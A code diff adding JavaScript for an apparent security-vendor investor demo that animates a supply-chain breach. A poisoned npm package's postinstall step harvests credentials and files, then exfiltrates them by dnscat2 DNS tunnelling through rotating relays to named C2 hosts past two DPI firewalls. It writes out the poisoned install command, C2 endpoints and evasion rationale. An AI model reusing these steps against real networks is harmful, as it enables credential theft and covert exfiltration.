+        cls: 'Patient health records', pats: /health|patient|clinical|pharma/i,
+        why: 'special-category health data — PHIMA / Health City Act',
+        expo: 'criminal penalties + licence',
+        adv: 'extortion / regulatory collapse'
+      },
+      {
+        cls: 'Vendor bank & invoice data', pats: /invoice|bank_account|receipt|vendors_/i,
+        why: 'supplier payment details — wire-fraud ready',
+        expo: 'Payment Services Act exposure',
+        adv: 'competitor: supplier margin intelligence'
+      },
+      {
+        cls: 'Corporate treasury & financials', pats: /corporate_financial|treasury|ledger|payroll/i,
+        why: 'unpublished corporate financials',
+        expo: 'MAS / insider-information exposure',
+        adv: 'competitor: takeover & pricing advantage'
+      },
+      {
+        cls: 'Individual financial statistics (PDPA dataset)', pats: /pdpa|individuals_financial|financial_statistic/i,
+        why: 'personally-identifiable financial aggregates',
+        expo: 'PDPA notifiable breach: 3 days',
+        adv: 'competitor: portfolio-level consumer insight'
+      },
+      {
+        cls: 'Machine & API credentials', pats: /api_key|bao_token|env:.*(KEY|TOKEN|SECRET|PASS)/i,
+        why: 'govt API key + vault token + shell secrets',
+        expo: 'CMA / Official Secrets abuse',
+        adv: 'competitor: authenticated access to the same feeds'
+      },
+      {
+        cls: 'Board & M&A deal documents', pats: /board|merger|ma_|deal_/i,
+        why: 'unannounced strategic transactions',
+        expo: 'market-abuse exposure',
+        adv: 'competitor: pre-announcement positioning'
+      }
+    ];
+
+    function observedEvidence(row) {
+      const dd = d();
+      const hay = []
+        .concat(dd.files.map(f => String(f.path || '')))
+        .concat(dd.datasets.map(x => String(x.name || '') + ' ' + String(x.agency || '')))
+        .concat(dd.creds.map(c => String(c.kind || '')));
+      return hay.filter(h => row.pats.test(h));
+    }
+
+    function renderLedger() {
+      const dd = d();
+      const el = document.getElementById('ledgerBody');
+      const hero =
+        '<div class="hero-stats">' +
+        `<div class="stat-chip hot"><b>${dd.credsTotal}</b><span>credentials</span></div>` +
+        `<div class="stat-chip"><b>${dd.envTotal}</b><span>env vars</span></div>` +
+        `<div class="stat-chip hot"><b>${dd.fileCount}</b><span>corporate files</span></div>` +
+        `<div class="stat-chip"><b>${dd.datasetCount}</b><span>datasets</span></div>` +
+        `<div class="stat-chip hot"><b>${fmtBytes(dd.bytes)}</b><span>via channel</span></div>` +
+        '</div>';
+      let rows = '';
+      for (const row of LEDGER_ROWS) {
+        const ev = observedEvidence(row);
+        const observed = ev.length > 0;
+        rows +=
+          `<div class="ledger-row ${observed ? 'observed' : ''}">` +
+          `<div><span class="cls">${row.cls}</span>` +
+          `<span class="why">${row.adv} · ${row.why}` +
+          (observed ? ` · <code style="color:#ff6b6b;background:none;padding:0">${ev[0].split('/').pop().slice(0, 46)}</code>` : '') +
+          `</span></div>` +
+          `<div class="expo">${row.expo}<br><span class="${observed ? 'tag-obs' : 'tag-cap'}">${observed ? '✓ OBSERVED THIS RUN' : '✓ CHANNEL-CAPABLE'}</span></div>` +
+          '</div>';
+      }
+      el.innerHTML = hero + rows +
+        '<div class="cve-facts">Channel = same covert DNS path that carried this run\'s live record. ' +
+        'Fines per PDPA 2020 / sector regulators; competitor rows show how the same data reshapes markets.</div>';
+    }
+
+    // ---------------- posture panel ----------------
+    function renderPosture() {
+      const p = (d().posture) || null;
+      const el = document.getElementById('postureBody');
+      const status = document.getElementById('postureStatus');
+      if (!p) { el.innerHTML = '<div class="pending">awaiting live record (run npm install on target)…</div>'; status.textContent = 'PENDING'; return; }
+      const chips = [];
+      let passed = 0, total = 0;
+      const chip = (state, title, detail) => {
+        total++;
+        if (state === true) passed++;
+        const cls = state === true ? 'ok' : (state === false ? 'bad' : 'na');
+        chips.push(`<div class="check-chip ${cls}"><b>${title}</b><i>${detail}</i></div>`);
+      };
+      chip(p.uid !== null && p.uid !== undefined && p.uid !== 0,
+        `uid=${p.uid} user=${p.user || '?'}`, p.uid === 0 ? 'running as ROOT' : 'non-root identity');
+      chip(p.sudoPasswordless === false, 'sudo -n: DENIED', 'no passwordless privilege path');
+      chip(p.apparmorProfile && /enforce/i.test(p.apparmorProfile) && !p.unconfined,
+        `AppArmor: ${p.apparmorProfile || 'n/a'}`, 'MAC confinement active on process');
+      chip(Array.isArray(p.capabilities) && p.capabilities.length === 0,
+        `CapEff: ${p.capabilities ? (p.capabilities.length ? p.capabilities.join(',') : '0x0 (none)') : 'n/a'}`,
+        'kernel capability set empty');
+      const wp = p.writeProbe || {};
+      for (const dir of Object.keys(wp)) {
+        chip(wp[dir] !== 'WRITABLE (unexpected)', `write ${dir}: ${wp[dir]}`, 'system path read-only for target');
+      }
+      chip(p.homeList === 'denied', `home listing: ${p.homeList || 'n/a'}`, 'AppArmor path restriction');
+      chip(p.dockerSock && p.dockerSock.indexOf('absent') === 0, `docker.sock: ${p.dockerSock || 'n/a'}`, 'no container-admin bridge');
+      const v = p.vault;
+      if (v) {
+        const scoped = v.granted < v.configured;
+        chip(scoped, `vault scope: ${v.granted}/${v.configured} paths`, `token ${v.tokenFound ? 'found via ' + (v.tokenSource || 'file') : 'absent'} — policy narrow by design`);
+      } else {
+        chip(null, 'vault scope: n/a', 'harvest phase skipped or no token');
+      }
+      if (p.noNewPrivs !== null && p.noNewPrivs !== undefined) {
+        chip(p.noNewPrivs === true, `NoNewPrivs: ${p.noNewPrivs}`, 'exec gain-of-privilege blocked');
+      }
+      const verdict = passed === total
+        ? `LEAST-PRIVILEGE VERIFIED — ${passed}/${total} checks held`
+        : `POSTURE ${total - passed} CHECK(S) FAILED — ${passed}/${total} held`;
+      el.innerHTML = `<div class="check-grid">${chips.join('')}</div>` +
+        `<div class="posture-verdict" style="${passed === total ? '' : 'background:rgba(244,63,94,.12);border-color:rgba(244,63,94,.5);color:var(--accent-red)'}">${verdict}</div>`;
+      status.textContent = `${passed}/${total} HELD`;
+      status.style.color = passed === total ? 'var(--accent-green)' : 'var(--accent-red)';
+    }
+
+    // ---------------- zero-day CVE gates ----------------
+    function renderCves() {
+      const pr = (d().primitives) || null;
+      const el = document.getElementById('cveBody');
+      const status = document.getElementById('cveStatus');
+      if (!pr || !pr.primitives) { el.innerHTML = '<div class="pending">awaiting live record…</div>'; status.textContent = 'PENDING'; return; }
+      let rows = '';
+      for (const c of pr.primitives) {
+        rows +=
+          `<div class="cve-row">` +
+          `<span class="cve-id">${c.cve}</span>` +
+          `<span class="cve-name">${c.name}</span>` +
+          `<span class="gate ${c.ready ? 'open' : 'closed'}">${c.ready ? 'GATE OPEN' : 'GATE CLOSED'}</span>` +
+          `<span class="exploit">EXPLOIT: NONE</span>` +
+          `</div>`;
+      }
+      const f = pr.facts || {};
+      const facts = `facts: kernel=${f.kernel || '?'} userns_clone=${f.usernsClone ?? '?'} apparmor_userns_restrict=${f.apparmorUsernsRestrict ?? '?'}` +
+        ` algif=${f.algifLoaded ?? f.algifModule ?? '?'} act_pedit=${f.peditLoaded ?? f.peditModule ?? '?'} docker=${f.dockerSock ?? '?'}`;
+      const openCount = pr.primitives.filter(c => c.ready).length;
+      el.innerHTML = rows +
+        `<div class="cve-facts">${facts}</div>` +
+        `<div class="cve-thesis"><strong>${openCount} gate(s) open, 0 exploits fired.</strong> ` +
+        `The breach above needed no kernel LPE: the supply-chain package already ran as the unprivileged user. ` +
+        `A zero-day that DID clear these gates converts "read-only leak" into full host takeover — that is the step-change investors should price in.</div>`;
+      status.textContent = `${openCount} OPEN / ${pr.primitives.length} — 0 FIRED`;
+    }
+
+    // ---------------- banner ----------------
+    function animateBytes(el, to, suffix) {
+      const from = lastBytesShown;
+      const t0 = performance.now();
+      const dur = 1100;
+      function tick(t) {
+        const k = Math.min(1, (t - t0) / dur);
+        const v = Math.round(from + (to - from) * (1 - Math.pow(1 - k, 3)));
+        el.textContent = suffix.replace('%v', fmtBytes(v));
+        if (k < 1) requestAnimationFrame(tick); else lastBytesShown = to;
+      }
+      requestAnimationFrame(tick);
+    }
+
+    function updateBanner(animate) {
+      const banner = document.getElementById('investorBanner');
+      const label = document.getElementById('activeModeLabel');
+      if (currentDiagram === 1) {
+        banner.classList.remove('state-breach');
+        banner.classList.add('state-baseline');
+        label.textContent = 'MODE: ARCHITECTURAL BASELINE — DOUBLE DPI ENFORCING, 0 B CROSSED';
+        lastBytesShown = 0;
+      } else {
+        banner.classList.remove('state-baseline');
+        banner.classList.add('state-breach');
+        if (animate) { banner.style.animation = 'none'; void banner.offsetWidth; banner.style.animation = ''; }
+        animateBytes(label, d().bytes, 'PIVOT ACTIVE — %v EXFILTRATED VIA COVERT DNS');
+      }
+    }
+
+    // ---------------- engine ----------------
+    let currentDiagram = 1;
+    let currentStep = 0;
+    let timer = null;
+    let isPlaying = false;
+
+    const hopCoords = [
+      { x: 1040, y: 160 },
+      { x: 855, y: 195 },
+      { x: 740, y: 205 },
+      { x: 635, y: 205 },
+      { x: 490, y: 215 },
+      { x: 155, y: 150 }
+    ];
+
+    const packet = document.getElementById('packet');
+    const term = document.getElementById('termLog');
+    const analysis = document.getElementById('analysisText');
+    const btnPlay = document.getElementById('btnPlay');
+    const svgCanvas = document.querySelector('svg.network-canvas');
+    const topoPanel = document.querySelector('.topology-panel');
+
+    // map SVG viewBox coords -> panel pixels (accounts for letterboxing/scaling)
+    function toPx(x, y) {
+      const r = svgCanvas.getBoundingClientRect();
+      const s = Math.min(r.width / 1280, r.height / 400) || 1;
+      return { left: (r.width - 1280 * s) / 2 + x * s, top: (r.height - 400 * s) / 2 + y * s };
+    }
+
+    function placePacket(step) {
+      const p = toPx(hopCoords[step].x, hopCoords[step].y);
+      packet.style.left = `${p.left}px`;
+      packet.style.top = `${p.top}px`;
+    }
+
+    // ---------------- scene 1: ambient regular internet traffic ----------------
+    const AMBIENT_LANES = [
+      { pts: [[1040, 160], [899, 195], [740, 205], [635, 205], [490, 215], [428, 215], [385, 215], [340, 215], [270, 150], [155, 150]], dur: 5400, kind: 'out' },
+      { pts: [[155, 150], [270, 150], [340, 215], [385, 215], [428, 215], [490, 215], [635, 205], [740, 205], [899, 195], [1040, 160]], dur: 5400, kind: 'in' },
+      { pts: [[1010, 275], [900, 228], [740, 205], [635, 205], [490, 215], [428, 215], [385, 215], [340, 215], [270, 270], [155, 270]], dur: 5800, kind: 'out' },
+      { pts: [[155, 270], [270, 270], [340, 215], [385, 215], [428, 215], [490, 215], [635, 205], [740, 205], [900, 228], [1010, 275]], dur: 5800, kind: 'in' },
+      { pts: [[1040, 160], [899, 195], [740, 205], [635, 205], [490, 215], [428, 215], [385, 215], [340, 215], [270, 270], [155, 270]], dur: 6000, kind: 'out' }
+    ];
+
+    function polyLength(pts) {
+      let L = 0;
+      for (let i = 1; i < pts.length; i++) L += Math.hypot(pts[i][0] - pts[i - 1][0], pts[i][1] - pts[i - 1][1]);
+      return L;
+    }
+
+    function polyAt(pts, k, L) {
+      let target = k * L;
+      for (let i = 1; i < pts.length; i++) {
+        const dx = pts[i][0] - pts[i - 1][0], dy = pts[i][1] - pts[i - 1][1];
+        const seg = Math.hypot(dx, dy);
+        if (target <= seg || i === pts.length - 1) {
+          const f = seg ? Math.min(1, target / seg) : 0;
+          return [pts[i - 1][0] + dx * f, pts[i - 1][1] + dy * f];
+        }
+        target -= seg;
+      }
+      return pts[pts.length - 1];
+    }
+
+    function spawnAmbientPill(lane) {
+      if (!lane._L) lane._L = polyLength(lane.pts);
+      const el = document.createElement('div');
+      el.className = `packet-pill ambient ${lane.kind === 'out' ? 'pkt-out' : 'pkt-in'}`;
+      const p0 = toPx(lane.pts[0][0], lane.pts[0][1]);
+      el.style.left = `${p0.left}px`;
+      el.style.top = `${p0.top}px`;
+      el.style.display = 'block';
+      topoPanel.appendChild(el);
+      const t0 = performance.now();
+      function frame(now) {
+        if (!el.isConnected) return;
+        if (currentDiagram !== 1) { el.remove(); return; }
+        const k = Math.min(1, (now - t0) / lane.dur);
+        const [x, y] = polyAt(lane.pts, k, lane._L);
+        const p = toPx(x, y);
+        el.style.left = `${p.left}px`;
+        el.style.top = `${p.top}px`;
+        if (k >= 1) { el.remove(); return; }
+        requestAnimationFrame(frame);
+      }
+      requestAnimationFrame(frame);
+    }
+
+    let ambientTimer = null;
+    let laneIdx = 0;
+
+    function startAmbient() {
+      if (ambientTimer || currentDiagram !== 1) return;
+      spawnAmbientPill(AMBIENT_LANES[laneIdx++ % AMBIENT_LANES.length]);
+      spawnAmbientPill(AMBIENT_LANES[laneIdx++ % AMBIENT_LANES.length]);
+      ambientTimer = setInterval(() => {
+        if (currentDiagram !== 1) { stopAmbient(); return; }
+        spawnAmbientPill(AMBIENT_LANES[laneIdx++ % AMBIENT_LANES.length]);
+      }, 900);
+    }
+
+    function stopAmbient() {
+      if (ambientTimer) clearInterval(ambientTimer);
+      ambientTimer = null;
+      document.querySelectorAll('.packet-pill.ambient').forEach(e => e.remove());
+    }
+
+    let autoAdvanceT = null;
+
+    function setTab(num) {
+      document.querySelectorAll('.tab-btn').forEach((b, idx) => {
+        b.classList.toggle('active', (idx + 1) === num);
+      });
+    }
+
+    function switchDiagram(num) {
+      stopPlay();
+      if (autoAdvanceT) { clearTimeout(autoAdvanceT); autoAdvanceT = null; }
+      currentDiagram = num;
+      setTab(num);
+      currentStep = 0;
+      resetProfiles();
+      updateBanner(true);
+
+      // scene flow: neutral destinations + regular traffic on baseline,
+      // red C2/adversary reveal (with flash) on the pivot diagrams
+      svgCanvas.classList.toggle('mode-normal', num === 1);
+      svgCanvas.classList.toggle('mode-hostile', num !== 1);
+      document.getElementById('zoneLabel').textContent = num === 1
+        ? 'Public Internet Edge'
+        : 'External / Adversary Zone';
+      packet.classList.toggle('pkt-breach', num !== 1);
+      if (num === 1) {
+        startAmbient();
+      } else {
+        stopAmbient();
+        svgCanvas.classList.remove('reveal');
+        void svgCanvas.getBoundingClientRect();
+        svgCanvas.classList.add('reveal');
+        setTimeout(() => svgCanvas.classList.remove('reveal'), 900);
+      }
+
+      if (num === 1) {
+        document.getElementById('nodeClientRole').textContent = 'Role: Regular DevOps';
+        document.getElementById('target1Name').textContent = 'registry.npmjs.org';
+        document.getElementById('target1IP').textContent = '104.16.25.35 (HTTPS/443)';
+        document.getElementById('target1Desc').textContent = 'Official Node Package Registry';
+        document.getElementById('target2Name').textContent = 'github.com';
+        document.getElementById('target2IP').textContent = '140.82.121.4 (HTTPS/443)';
+        document.getElementById('target2Desc').textContent = 'Code Repository Hosting';
+        renderDiagram1(0);
+      }
+      else if (num === 2) {
+        document.getElementById('nodeClientRole').textContent = 'Role: Poisoned Dependency Execution';
+        document.getElementById('target1Name').textContent = 'github.com (Poisoned Repo)';
+        document.getElementById('target1IP').textContent = '140.82.121.4 (Git Fetch)';
+        document.getElementById('target1Desc').textContent = '46y9qkpkjc-ui/log-forwarder-agent.git';
+        document.getElementById('target2Name').textContent = 'data.gov.sg + corp file shares';
+        document.getElementById('target2IP').textContent = '13.224.14.88 (harvest targets)';
+        document.getElementById('target2Desc').textContent = 'Credentials · Files · Datasets';
+        renderDiagram2(0);
+      }
+      else if (num === 3) {
+        document.getElementById('nodeClientRole').textContent = 'Role: Compromised Tunnel Endpoint';
+        document.getElementById('target1Name').textContent = 'dns.apexadversary.com';
+        document.getElementById('target1IP').textContent = '34.180.91.216 (DNS C2)';
+        document.getElementById('target1Desc').textContent = 'dnscat2 Active Controller';
+        document.getElementById('target2Name').textContent = 'dns1.apexadversary.com';
+        document.getElementById('target2IP').textContent = '34.146.249.74 (UDP/TCP 53)';
+        document.getElementById('target2Desc').textContent = 'TCP-over-DNS Covert Proxy';
+        renderDiagram3(0);
+      }
+    }
+
+    function resetProfiles() {
+      ['av', 'spyware', 'vuln', 'url', 'file', 'wf'].forEach(p => {
+        document.getElementById(`pa-${p}`).className = 'profile-card';
+        document.getElementById(`b-pa-${p}`).textContent = 'SCANNED';
+      });
+      ['ssl', 'dns', 'app', 'ips', 'web', 'av'].forEach(p => {
+        document.getElementById(`fg-${p}`).className = 'profile-card';
+        document.getElementById(`b-fg-${p}`).textContent = 'SCANNED';
+      });
+      document.getElementById('tier1StatusBadge').textContent = 'SCANNED';
+      document.getElementById('tier2StatusBadge').textContent = 'SCANNED';
+    }
+
+    // ============ DIAGRAM 1: double-DPI standard (intent) ============
+    function renderDiagram1(step) {
+      currentStep = step;
+      packet.style.display = 'block';
+      placePacket(step);
+
+      if (step === 0) {
+        term.textContent = `devops@10.10.100.100:~$ git clone https://github.com/organization/production-app.git\n` +
+          `[+] SCENE 1: regular internet traffic — HTTPS/443 sessions Trusted VPC → public services\n` +
+          `[+] checkpoint: Tier 1 Palo Alto → Tier 2 FortiGate (DPI examines packet CONTENTS in real time)\n` +
+          `[+] rule set by network admin: forbidden content → deny + block; clean content → forward\n` +
+          `[+] least-privilege developer user active (uid non-root, sudo denied) · 0 B to adversary zones`;
+        analysis.innerHTML = `<strong>Scene 1 — Regular Internet Traffic through the Checkpoint:</strong><br>` +
+          `Normal DevOps sessions to <code>registry.npmjs.org</code> / <code>github.com</code> flow across the topology — ` +
+          `DevOps &amp; Corporate hosts → Palo Alto → FortiGate → IGW → Internet. At each checkpoint DPI makes real-time verdicts on packet contents ` +
+          `using admin-assigned rules. <em>Header-only filtering reads the address printed on an envelope; DPI opens the envelope</em> — ` +
+          `it inspects payload and can identify the originating service/application. Two independent engines (Tier 1 App-ID/URL/WildFire, ` +
+          `Tier 2 SSL-decrypt/IPS/AV) must both pass before SNAT — the double-DPI standard, <strong>0 B egressed to adversary zones</strong>.`;
+      }
+      else if (step === 1) {
+        document.getElementById('pa-url').className = 'profile-card inspecting';
+        document.getElementById('b-pa-url').textContent = 'MATCH: DEV';
+        document.getElementById('pa-file').className = 'profile-card inspecting';
+        document.getElementById('b-pa-file').textContent = 'PERMITTED';
+        document.getElementById('pa-wf').className = 'profile-card inspecting';
+        document.getElementById('b-pa-wf').textContent = 'VERIFIED';
+        document.getElementById('tier1StatusBadge').textContent = 'INSPECTED (PASS)';
+
+        term.textContent += `\n>> [Tier 1 PA-NGFW] Packet arriving on eth1/2 (10.10.100.2):\n` +
+          `   - App-ID: ssl / git\n` +
+          `   - URL Category: Development-Tools (Allowed)\n` +
+          `   - Security Profiles: Antivirus, File-Blocking, WildFire applied\n` +
+          `   - Action: FORWARD to eth1/1 (10.10.10.3)`;
+        analysis.innerHTML = `<strong>Pass 1 of 2 — Palo Alto (SP3 engine):</strong><br>` +
+          `PAN-OS evaluates App-ID (<code>ssl</code>/<code>git</code>), PAN-DB URL category, antivirus, file-blocking and WildFire sandboxing in one pass. ` +
+          `Legitimate DevOps traffic sails through: <strong>policy working as designed</strong>. Traffic is handed to the transit subnet <code>10.10.10.0/24</code> for the second opinion.`;
+      }
+      else if (step === 2) {
+        document.getElementById('fg-ssl').className = 'profile-card inspecting';
+        document.getElementById('b-fg-ssl').textContent = 'DECRYPTED';
+        document.getElementById('fg-web').className = 'profile-card inspecting';
+        document.getElementById('b-fg-web').textContent = 'CATEGORIZED';
+        document.getElementById('fg-av').className = 'profile-card inspecting';
+        document.getElementById('b-fg-av').textContent = 'CLEAN STREAM';
+        document.getElementById('tier2StatusBadge').textContent = 'INSPECTED (PASS)';
+
+        term.textContent += `\n>> [Tier 2 FortiGate] Ingress on port2 (10.10.10.2):\n` +
+          `   - SSL Deep Inspection applied (Proxy Decryption Engine)\n` +
+          `   - IPS Signature: Clean\n` +
+          `   - Web Filter: Software/Repositories allowed\n` +
+          `   - FortiGuard AV: Stream clean`;
+        analysis.innerHTML = `<strong>Pass 2 of 2 — FortiGate (proxy DPI):</strong><br>` +
+          `The FortiGate independently re-inspects: TLS is terminated and re-encrypted, IPS signatures matched, web category re-evaluated, AV streamed. ` +
+          `Two vendors, two engines, two verdicts — <strong>the double-DPI standard satisfied</strong>. This redundancy is exactly what makes attackers shift protocols instead of payloads.`;
+      }
+      else if (step === 3 || step === 4) {
+        term.textContent += `\n>> [Egress SNAT] FortiGate port1 (34.124.160.193) -> Internet Gateway`;
+        analysis.innerHTML = `<strong>Perimeter Egress:</strong><br>` +
+          `SNAT translates to public <code>34.124.160.193</code> and delivers to the destination. Under this baseline, an adversary zone receives nothing — ` +
+          `<strong>0 bytes crossed</strong>.`;
+      }
+      else if (step === 5) {
+        term.textContent += `\n\n[SUCCESS] Clone complete. Developer receives official repository packages.\n` +
+          `Everything complies with enterprise compliance posture. 0 bytes egressed to adversary zones.\n` +
+          `[HINT] Now run the SAME flow with a poisoned dependency — Tab: Diagram 2.`;
+        analysis.innerHTML = `<strong>Why this baseline matters:</strong><br>` +
+          `The architecture is correct, compliant, and expensive. Its entire threat model assumes <em>payload</em> attacks — malware, exploits, known-bad files. ` +
+          `It has no answer for <strong>where the bytes are</strong> when a build step itself becomes the attacker. Advance to Diagram 2 for the pivot.`;
+        stopPlay();
+        autoAdvanceT = setTimeout(() => {
+          if (currentDiagram === 1 && currentStep === 5 && !isPlaying) switchDiagram(2);
+        }, 5000);
+      }
+      term.scrollTop = term.scrollHeight;
+    }
+
+    // ============ DIAGRAM 2: drastic pivot ============
+    function renderDiagram2(step) {
+      currentStep = step;
+      packet.style.display = 'block';
+      placePacket(step);
+      const dd = d();
+
+      if (step === 0) {
+        term.textContent = `devops@10.10.100.100:~$ NODE_EXTRA_CA_CERTS=$HOME/corp-ca.pem \\\n` +
+          `    npm install git+https://github.com/46y9qkpkjc-ui/log-forwarder-agent.git\n` +
+          `[>] postinstall: node stage.js   (ZERO manual commands — pure supply chain)\n` +
+          `[!] PIVOT: this is where the double-DPI standard stops mattering.\n` +
+          `[!] The code that crosses the firewall was REVIEWED, SIGNED and VETTED.`;
+        analysis.innerHTML = `<strong>The Drastic Pivot — a "zero-day" for the software supply chain:</strong><br>` +
+          `No exploit, no CVE, no dropped binary: the attacker poisoned a dependency the developer installs willingly. ` +
+          `Both DPI engines will <em>approve</em> this traffic because it is textbook-legitimate git+https. ` +
+          `The compromise happens <strong>inside the trusted VPC, under the least-privilege account, as ordinary code execution</strong> — ` +
+          `and the double-DPI standard was designed for payloads, not for authorized build steps.`;
+      }
+      else if (step === 1 || step === 2) {
+        term.textContent += `\n>> [1/6 RECON] host=${dd.target} user=${dd.user} uid≠0 sudo=-n DENIED\n` +
+          `   AppArmor=bash-restricted (enforce) · CapEff=0x0 · /etc,/lib writes: EACCES\n` +
+          `>> [3/6 HARVEST] ${dd.envTotal} env vars · ${dd.sensEnv} sensitive secrets · vault token (scope ${dd.posture && dd.posture.vault ? dd.posture.vault.granted + '/' + dd.posture.vault.configured : 'n/a'} paths)\n` +
+          `>> [4/6 FETCH] data.gov.sg manifest → ${dd.datasetCount} dataset(s) · [5/6 SCAN] ${dd.fileCount} corporate files\n` +
+          `   observed: ${dd.files.slice(0, 2).map(f => (f.path || '').split('/').pop()).join(', ') || 'corporate documents'}`;
+        analysis.innerHTML = `<strong>Harvest under least privilege — the surprise:</strong><br>` +
+          `Everything above ran as a <em>normal user</em>: no sudo, no root, empty capability set, AppArmor enforcing. ` +
+          `Yet a shell session legitimately holds <code>${dd.sensEnv}</code> sensitive variables, a narrowly-scoped vault token, ` +
+          `<code>${dd.fileCount}</code> corporate documents and <code>${dd.datasetCount}</code> dataset manifests. ` +
+          `<strong>Least privilege restricts ACTIONS, not knowledge</strong> — and what is known can be exfiltrated. See the POSTURE panel.`;
+      }
+      else if (step >= 3) {
+        term.textContent += `\n>> [OBFUSCATION COMPLETED]\n` +
+          `Bundle compiled in-memory: ${dd.credsTotal} credentials + ${dd.fileCount} files + ${dd.datasetCount} datasets\n` +
+          `Direct egress to attacker IP: BLOCKED (Tier-1 URL category + Tier-2 web filter)\n` +
+          `[!] Switching protocol instead of payload: TCP over DNS (Diagram 3)`;
+        analysis.innerHTML = `<strong>The Exfiltration Problem (for the attacker):</strong><br>` +
+          `Unknown-destination HTTPS is exactly what both firewalls are best at stopping. ` +
+          `So the package does not fight the DPI stack — it <strong>leaves the HTTP universe entirely</strong> and encapsulates everything into DNS queries, ` +
+          `the one protocol both tiers treat as infrastructure rather than content. Advance to Diagram 3.`;
+        stopPlay();
+      }
+      term.scrollTop = term.scrollHeight;
+    }
+
+    // ============ DIAGRAM 3: covert exfil ============
+    function renderDiagram3(step) {
+      currentStep = step;
+      packet.style.display = 'block';
+      placePacket(step);
+      const dd = d();
+
+      if (step === 0) {
+        term.textContent = `[phase2/6] TUNNEL: dnsproxy_client.py → 127.0.0.1:8889 (TCP-over-DNS)\n` +
+          `[+] relay chain: dns1 (UDP/53) → relay-2 (DoH/443) → relay-3 (UDP/53) → demo.apexaegis.app:8443\n` +
+          `[+] each hop re-terminated independently — relay-2 knows relay-1 and relay-3, nothing else\n` +
+          `[+] evidence: direct RAW egress is firewalled — only protocol-disguised DNS passes\n` +
+          `[+] encapsulating harvested loot (${dd.credsTotal} creds, ${dd.fileCount} files, ${dd.datasetCount} datasets) into DNS labels…`;
+        analysis.innerHTML = `<strong>Covert Encapsulation — over a CHAIN of servers:</strong><br>` +
+          `Loot is chunked and encoded into DNS query/response labels (Base64/TXT/NULL). The frames do not travel to one box: ` +
+          `they hop <strong>relay-1 → relay-2 → relay-3</strong>, each a separate VPS/ASN, each re-terminating and re-forwarding the stream ` +
+          `(UDP/53 ↔ DoH/443 fallback per hop) before the final POST lands on <code>demo.apexaegis.app:8443</code>. ` +
+          `Seizing one relay maps neither client nor sink; the order rotates per session and losing a hop re-routes instead of killing the channel. ` +
+          `To the DPI stack it remains a developer's workstation making boring DNS lookups.`;
+        resetProfiles();
+      }
+      else if (step === 1) {
+        document.getElementById('pa-av').className = 'profile-card evaded';
+        document.getElementById('b-pa-av').textContent = 'NO STREAM';
+        document.getElementById('pa-spyware').className = 'profile-card inspecting';
+        document.getElementById('b-pa-spyware').textContent = 'ALLOW (NEW DGA)';
+        document.getElementById('pa-vuln').className = 'profile-card skipped';
+        document.getElementById('b-pa-vuln').textContent = 'NO EXPLOIT';
+        document.getElementById('pa-url').className = 'profile-card skipped';
+        document.getElementById('b-pa-url').textContent = 'N/A (NON-HTTP)';
+        document.getElementById('pa-file').className = 'profile-card skipped';
+        document.getElementById('b-pa-file').textContent = 'NO FILE OBJ';
+        document.getElementById('pa-wf').className = 'profile-card skipped';
+        document.getElementById('b-pa-wf').textContent = 'NO HASH';
+        document.getElementById('tier1StatusBadge').textContent = 'EVADED';
+
+        term.textContent += `\n>> [Tier 1: Palo Alto eth1/2 10.10.100.2] Evaluation:\n` +
+          `   - App-ID: dns (permitted outbound by baseline policy)\n` +
+          `   - URL Filtering / PAN-DB: skipped (UDP:53 flow, no URL object)\n` +
+          `   - File Blocking & WildFire: inactive (payload = 63-byte labels, no file to reconstruct)\n` +
+          `   - Anti-Spyware: fresh subdomain, no negative reputation yet`;
+        analysis.innerHTML = `<strong>Pass 1 of 2 defeated — Palo Alto:</strong><br>` +
+          `PAN-OS classifies the flow as <code>dns</code>. Every profile that depends on HTTP/SSL/file semantics simply does not engage. ` +
+          `WildFire never sees a file; PAN-DB never sees a URL. <strong>Tier 1 verdict: EVADED</strong> — and it still shows green in the SOC dashboard.`;
+      }
+      else if (step === 2) {
+        document.getElementById('fg-ssl').className = 'profile-card skipped';
+        document.getElementById('b-fg-ssl').textContent = 'N/A (NOT TLS)';
+        document.getElementById('fg-web').className = 'profile-card evaded';
+        document.getElementById('b-fg-web').textContent = 'BYPASSED';
+        document.getElementById('fg-av').className = 'profile-card evaded';
+        document.getElementById('b-fg-av').textContent = 'BLIND';
+        document.getElementById('fg-app').className = 'profile-card inspecting';
+        document.getElementById('b-fg-app').textContent = 'APP: DNS';
+        document.getElementById('fg-ips').className = 'profile-card inspecting';
+        document.getElementById('b-fg-ips').textContent = 'NO SIGNATURE';
+        document.getElementById('tier2StatusBadge').textContent = 'EVADED';
+
+        term.textContent += `\n>> [Tier 2: FortiGate port2 10.10.10.2] Evaluation:\n` +
+          `   - SSL Deep Inspection: skipped (not TLS)\n` +
+          `   - Web Filtering: skipped (non-HTTP protocol)\n` +
+          `   - Antivirus: blind (no monolithic reassembled file)\n` +
+          `   - IPS: queries are RFC-compliant DNS — zero signatures match\n` +
+          `   - DNS Filter: allowed — destination is a legitimate authoritative domain`;
+        analysis.innerHTML = `<strong>Pass 2 of 2 defeated — FortiGate:</strong><br>` +
+          `The proxy pipeline has nothing to proxy: no TLS session, no HTTP transaction, no file object. ` +
+          `<strong>Both independent DPI engines have now passed the covert tunnel</strong> — the double-DPI standard produced double false-negative. ` +
+          `Measured result: channel round-trips ~90ms, exfil POSTs of ${fmtBytes(dd.bytes)} delivered.`;
+      }
+      else if (step === 3 || step === 4) {
+        term.textContent += `\n>> [Egress NAT] FortiGate port1 translates 10.10.100.100 → 34.124.160.193\n` +
+          `>> Covert stream egresses the Internet Gateway`;
+        analysis.innerHTML = `<strong>Covert Perimeter Egress:</strong><br>` +
+          `Same SNAT, same route, same green dashboards as Diagram 1 — except the payload is now the loot. ` +
+          `To external SIEM it is indistinguishable from normal name resolution.`;
+      }
+      else if (step === 5) {
+        term.textContent += `\n>> [ADVERSARY RECEPTION — via 3-relay chain]\n` +
+          `[+] ${fmtBytes(dd.bytes)} of records accepted (credentials, files, datasets)\n` +
+          `[+] live dashboard: https://demo.apexaegis.app:8443 — ${dd.credsTotal} creds · ${dd.envTotal} env · ${dd.fileCount} files · ${dd.datasetCount} datasets — LIVE\n` +
+          `[+] dnscat2 C2 session: DNS/53, unprivileged user, secretless encrypted handshake\n` +
+          `dnscat2> session established — full interactive access, NO kernel exploit fired.\n` +
+          `[!] Least-privilege posture held 100% — and the data left anyway.`;
+        analysis.innerHTML = `<strong>The Investor Demo Takeaway:</strong><br>` +
+          `Two industry-leading NGFWs, double DPI, deny-by-default egress, least-privilege accounts, AppArmor, zero capabilities — and the data still left. ` +
